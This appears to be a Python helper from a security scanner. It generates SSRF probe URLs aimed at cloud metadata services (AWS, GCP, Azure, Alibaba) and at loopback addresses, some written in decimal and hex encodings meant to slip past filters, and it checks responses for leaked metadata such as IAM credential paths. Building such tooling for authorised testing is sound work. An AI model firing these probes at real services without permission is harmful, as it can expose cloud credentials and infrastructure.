"""
SSRF probe generator.

Builds a list of URL variants targeting common SSRF sinks:
- cloud metadata endpoints (AWS / GCP / Azure / Alibaba)
- localhost / loopback variants
- private RFC1918 ranges
- DNS rebinding-style hosts

The caller plugs these into an existing HTTP task and watches for 2xx
or response bodies that contain known metadata markers.
"""

from typing import Any, Dict, Iterable, List

_METADATA_TARGETS = (
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://100.100.100.200/latest/meta-data/",
)

_LOOPBACK_VARIANTS = (
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://2130706433/",   # decimal-encoded 127.0.0.1
    "http://0x7f000001/",   # hex-encoded
    "http://127.1/",        # truncated octets
)


def build_ssrf_targets() -> List[str]:
    """Return the canonical SSRF target list."""
    return list(_METADATA_TARGETS) + list(_LOOPBACK_VARIANTS)


def render_ssrf_tasks(template_task: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    Clone ``template_task`` once per SSRF target with ``request_url``
    replaced and ``name`` annotated for reporting.
    """
    out: List[Dict[str, Any]] = []
    for target in build_ssrf_targets():
        copy = dict(template_task)
        copy["request_url"] = target
        copy["name"] = f"ssrf::{target}"
        out.append(copy)
    return out


def find_metadata_leak(body: str) -> List[str]:
    """Return matched marker strings if a response body looks like cloud metadata."""
    markers = [
        "ami-id", "iam/security-credentials", "instance-id",
        "computeMetadata", "metadata.google",
        "Metadata-Flavor", "x-ms-imds-instance-id",
    ]
    return [marker for marker in markers if marker.lower() in (body or "").lower()]
